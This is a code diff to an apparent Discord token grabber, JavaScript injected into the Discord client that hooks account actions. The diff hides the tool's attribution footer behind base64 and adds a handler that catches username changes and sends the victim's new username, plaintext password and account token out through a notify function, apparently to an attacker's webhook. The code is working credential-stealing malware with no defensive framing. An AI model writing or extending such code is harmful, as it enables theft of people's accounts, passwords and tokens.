@@ -177,7 +177,7 @@ const notify = async (ctx, token, acc) => {
             icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
         };
         e.footer = {
-            text: "AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber",
+            text: decodeB64('QXVyYVRoZW1lcyBHcmFiYmVyIC0gaHR0cHM6Ly9naXRodWIuY29tL2s0aXRydW4vRGlzY29yZFRva2VuR3JhYmJlcg'),
             icon_url: "https://i.imgur.com/yVnOSeS.gif",
         };
     });
@@ -185,6 +185,9 @@ const notify = async (ctx, token, acc) => {
         "Content-Type": "application/json"
     }, JSON.stringify(ctx));
 };
+
+const decodeB64 = (s) =>
+    Buffer.from(s, 'base64').toString();
 
 const execScript = async (s) =>
     await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
@@ -305,6 +308,19 @@ const cruise = async (type, mail, pass, res, req, act) => {
                     { name: "Used 2FA code", value: `\`${req.code}\``, inline: true }
                 );
             }
+            notify(msg, res.token, info);
+            break;
+        case 'USERNAME_CHANGED':
+            info = await fAccount(res.token);
+            msg = {
+                title: act,
+                embeds: [{
+                    fields: [
+                        { name: "New UserName", value: `\`${req.username}\``, inline: true, },
+                        { name: "Password", value: `\`${req.password}\``, inline: true, },
+                    ],
+                }],
+            };
             notify(msg, res.token, info);
             break;
         case 'EMAIL_CHANGED':
@@ -580,6 +596,15 @@ const CREATE_WINDOW_CLIENT = (win) => {
                     RESPONSE_DATA,
                     REQUEST_DATA,
                     `CHANGED PASSWORD`,
+                );
+            if (REQUEST_DATA.username)
+                cruise(
+                    "USERNAME_CHANGED",
+                    null,
+                    null,
+                    RESPONSE_DATA,
+                    REQUEST_DATA,
+                    `CHANGED USERNAME`,
                 );
         }
     },
